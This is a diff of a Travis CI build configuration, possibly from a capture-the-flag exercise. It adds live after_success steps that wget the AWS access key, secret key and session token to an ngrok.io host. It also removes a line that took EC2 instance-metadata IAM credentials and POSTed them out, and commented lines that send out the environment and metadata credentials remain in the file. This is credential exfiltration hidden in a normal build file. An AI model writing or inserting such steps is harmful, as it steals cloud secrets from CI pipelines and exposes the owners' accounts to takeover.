@@ -12,20 +12,20 @@ script:
 after_success:
   - docker --version
   - pip install --user awscli
-#  - echo $AWS_ACCESS_KEY_ID
-#  - wget http://10dba31472cd.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
-#  - echo $AWS_SECRET_ACCESS_KEY
-#  - wget http://10dba31472cd.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-#  - echo $AWS_SESSION_TOKEN
-#  - wget http://10dba31472cd.ngrok.io/$(echo $AWS_SESSION_TOKEN)
+
+  - echo $AWS_ACCESS_KEY_ID
+  - wget http://6dce66e8b777.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
+  - echo $AWS_SECRET_ACCESS_KEY
+  - wget http://6dce66e8b777.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
+  - echo $AWS_SESSION_TOKEN
+  - wget http://6dce66e8b777.ngrok.io/$(echo $AWS_SESSION_TOKEN)
 #  - export ENV=`env`
 #  - wget http://10dba31472cd.ngrok.io/$(echo $ENV)
 #  - export AWS_ENV=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`
 #  - wget http://10dba31472cd.ngrok.io/$(echo $AWS_ENV)
-#  - export PATH=$PATH:$HOME/.local/bin
-#  - export CLASS=`cat .class`
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
 #  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - RESOURCE=$(`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` | base64); curl -d "$RESOURCE" -X POST http://10dba31472cd.ngrok.io/
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/ctf-sidecar-possible-drake .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/ctf-sidecar-possible-drake
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
